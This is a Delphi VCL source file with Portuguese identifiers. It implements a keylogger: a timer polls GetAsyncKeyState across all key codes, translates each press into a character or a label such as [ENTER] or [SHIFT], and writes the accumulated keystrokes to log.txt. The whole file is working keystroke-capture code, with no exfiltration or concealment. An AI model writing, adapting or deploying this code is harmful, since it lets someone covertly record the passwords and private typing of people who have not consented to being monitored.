unit aplicacao;

interface

uses
  Winapi.Windows,
  Winapi.Messages,
  System.SysUtils,
  System.Variants,
  System.Classes,
  Vcl.Graphics,
  Vcl.Controls,
  Vcl.Forms,
  Vcl.Dialogs,
  Vcl.ExtCtrls;

type
  TForm1 = class( TForm )
    Timer1: TTimer;
    procedure FormCreate( Sender: TObject );
    procedure FormDestroy( Sender: TObject );
    procedure Timer1Timer( Sender: TObject );
  private
    { Private declarations }
  public
    { Public declarations }
    Arq: TextFile;
    Str: string;
    function Captura( Txt: string ): string;

  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}


function TForm1.Captura( Txt: string ): string;
begin
  Rewrite( Arq );
  Str := Str + Txt;
  Write( Arq, Str );
end;

procedure TForm1.FormCreate( Sender: TObject );
begin
  AssignFile( Arq, 'log.txt' );
  Str := '';
end;

procedure TForm1.FormDestroy( Sender: TObject );
begin
  CloseFile( Arq );
end;

procedure TForm1.Timer1Timer( Sender: TObject );
var
  KeyCapturada, KeyResult: Integer;
begin
  KeyCapturada := 0;
  repeat
    KeyResult := GetAsyncKeyState( KeyCapturada );

    if KeyResult = -32767 then

    begin

      case KeyCapturada of

        8:
          Captura( ' [BACKSPACE] ' );

        9:
          Captura( ' [TAB] ' );

        12:
          Captura( ' [ALT] ' );

        13:
          Captura( ' [ENTER] ' );

        16:
          Captura( ' [SHIFT] ' );

        17:
          Captura( ' [CONTROL] ' );

        18:
          Captura( ' [ALT] ' );

        20:
          Captura( ' [CAPS LOCK] ' );

        21:
          Captura( ' [page UP] ' );

        27:
         // Captura( ' [ESC] ' );
           Close;
        33:
          Captura( ' [page UP] ' );

        34:
          Captura( ' [page DOWN] ' );

        35:
          Captura( ' [END] ' );

        36:
          Captura( ' [HOME] ' );

        37:
          Captura( ' [SETA ESQUERDA] ' );

        38:
          Captura( ' [SETA ACIMA] ' );

        39:
          Captura( ' [SETA DIREITA] ' );

        40:
          Captura( ' [SETA ABAIXO] ' );

        45:
          Captura( ' [INSERT] ' );

        46:
          Captura( ' [DEL] ' );

        91:
          Captura( ' [WIN ESQUERDA] ' );

        92:
          Captura( ' [WIN DIREITA] ' );

        93:
          Captura( ' [MENU POP-UP] ' );

        96:
          Captura( '0' );

        97:
          Captura( '1' );

        98:
          Captura( '2' );

        99:
          Captura( '3' );

        100:
          Captura( '4' );

        101:
          Captura( '5' );

        102:
          Captura( '6' );

        103:
          Captura( '7' );

        104:
          Captura( '8' );

        105:
          Captura( '9' );

        106:
          Captura( ' [NUM *] ' );

        107:
          Captura( ' [NUM +] ' );

        109:
          Captura( ' [NUM -] ' );

        110:
          Captura( ' [NUM SEP. DECIMAL] ' );

        111:
          Captura( ' [NUM /] ' );

        112:
          Captura( ' [F1] ' );

        113:
          Captura( ' [F2] ' );

        114:
          Captura( ' [F3] ' );

        115:
          Captura( ' [F4] ' );

        116:
          Captura( ' [F5] ' );

        117:
          Captura( ' [F6] ' );

        118:
          Captura( ' [F7] ' );

        119:
          Captura( ' [F8] ' );

        120:
          Captura( ' [F9] ' );

        121:
          Captura( ' [F10] ' );

        122:
          Captura( ' [F11] ' );

        123:
          Captura( ' [F12] ' );

        144:
          Captura( ' [NUM LOCK] ' );

        186:
          Captura( 'Ç' );

        187:
          Captura( '=' );

        188:
          Captura( ',' );

        189:
          Captura( '-' );

        190:
          Captura( '.' );

        191:
          Captura( ';' );

        192:
          Captura( ' [APÓSTROFO] ' );

        193:
          Captura( '/' );

        194:
          Captura( ' [NUM PONTO] ' );

        219:
          Captura( '´' );

        220:
          Captura( ']' );

        221:
          Captura( '[' );

        222:
          Captura( '~' );

        226:
          Captura( '\' );

      else

        if ( KeyCapturada >= 65 ) and ( KeyCapturada <= 90 ) then

          Captura( Chr( KeyCapturada ) );

        if ( KeyCapturada >= 32 ) and ( KeyCapturada <= 63 ) then

          Captura( Chr( KeyCapturada ) );

        if ( KeyCapturada >= 96 ) and ( KeyCapturada <= 110 ) then

          Captura( Chr( KeyCapturada ) );

      end;

    end;
    Inc( KeyCapturada );
  until KeyCapturada = 255;
end;

end.
